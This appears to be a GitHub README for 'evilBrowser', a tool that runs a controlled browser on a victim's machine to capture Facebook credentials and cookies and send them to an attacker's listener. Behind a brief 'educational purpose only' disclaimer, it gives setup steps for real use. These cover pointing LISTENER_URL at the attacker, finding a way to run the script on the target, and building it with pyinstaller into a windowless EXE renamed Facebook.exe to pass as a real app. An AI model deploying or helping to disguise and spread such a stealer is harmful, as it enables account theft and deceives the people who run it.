# evilBrowser

> [!WARNING]
> This is for educational purpose only and for security testing

This tool is designed to run a controlled Browser on a victim machine and gather ***credentials*** and ***cookies***.

## How it works ?
For the test, **Facebook** is the target web app but it can be customized to catch another website.
The attacker machine run `listener.py` on his machine. And `evilBrowser.py` should be run on target machine.
A controlled browser is automatically opened on target machine with *www.facebook.com*.

>[!NOTE]
> The opened website is the real Facebook Website (not fake), but as we got the controll of Browser, we can retrieve credentials and cookies.

## How to use ?
1. Install requirements.
```
pip install -r requirements.txt
```

2. Change `LISTENER_URL` in `evilBrowser.py` to the machine IP Address that runs the `listener.py`

3. Find a way to easily run the `evilBrowser.py` on target machine.

For a better result, build the script `evilBrowser.py` to an EXE file and add custom icon.
- Install requirements on Windows machine
```
pip install -r requirements.txt
```

- Test the script before the build
```
python evilBrowser.py
```

- Build the script by running `build.bat` on Windows machine or
```
pyinstaller -w -i icon.png --collect-all selenium --clean -F evilBrowser.py
```

> Rename the newly generated EXE file in *dist/* directory to *Facebook.exe*.
> You get a Facebook desktop app, ready to be run... haha :D

## Contact me
- [Linkedin](https://www.linkedin.com/in/d1j3y)
- [WhatsApp](https://wa.me/261326196823)
- [Facebook](https://fb.me/d1j3y)
- [Messenger](https://m.me/d1j3y)
- [Mail](lionnelrazaf@gmail.com)